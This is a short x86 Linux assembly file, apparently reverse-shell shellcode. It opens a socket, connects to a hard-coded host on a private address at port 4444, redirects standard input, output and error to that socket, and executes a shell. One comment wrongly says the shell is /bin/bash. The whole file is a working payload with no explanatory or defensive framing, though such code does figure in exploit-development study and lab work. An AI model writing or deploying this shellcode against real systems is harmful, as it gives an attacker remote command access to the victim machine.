	section .text
global _start

_start:
	; creating socket
	xor eax, eax
	xor esi, esi
	xor ebx, ebx
	push esi
	push 0x1
	push 0x2
	; calling socket call for socket creating
	mov al, 102
	mov bl, 1
	mov ecx, esp
	int 0x80
	mov edx, eax

	; creating sockaddr_in and connect()
	push esi
	push esi
	push 0x6600a8c0
	push WORD 0x5c11
	push WORD 2
	mov ecx, esp
	push 0x16
	push ecx
	push edx
	; socketcall()
	mov al, 102
	mov bl, 3
	mov ecx, esp
	int 0x80

	; dup2 STDIN, STDOUT, STDERR
	xor ecx, ecx
	mov cl, 3
	mov ebx, edx
dup:	dec ecx
	mov al, 63
	int 0x80
	jns dup



	; execve /bin/bash
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
        mov ebx, esp
        push eax
        mov edx, eax
        push ebx
        mov ecx, esp
        mov al, 11
        int 0x80

